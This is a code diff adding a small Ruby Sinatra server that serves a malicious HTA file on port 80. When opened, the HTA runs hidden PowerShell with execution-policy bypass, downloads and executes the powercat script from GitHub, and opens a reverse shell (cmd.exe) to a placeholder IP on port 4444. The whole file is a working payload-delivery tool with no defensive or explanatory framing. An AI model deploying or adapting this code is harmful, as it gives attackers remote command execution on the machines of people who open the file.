@@ -1,0 +1,29 @@
+require 'rubygems'
+require 'thin'
+require 'rack'
+require 'sinatra'
+
+class Hta < Sinatra::Base
+   before do
+      content_type 'application/hta'
+   end
+
+   get "/page.hta" do
+   "<script>
+   var cmd = \"cmd.exe /c powershell.exe -nop -w hidden -ep bypass \ -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'))\\\"\\\"; powercat -c IP 4444 -e cmd.exe\";
+   new ActiveXObject('WScript.Shell').Run(cmd);
+   </script>"
+   end
+end
+
+@routes = {
+   "/" => Hta.new
+}
+
+@rack_app = Rack::URLMap.new(@routes)
+@thin = Thin::Server.new("0.0.0.0", 80, @rack_app)
+
+Thin::Logging.silent = false
+
+puts "[#{Time.now}] Thin ready"
+@thin.start
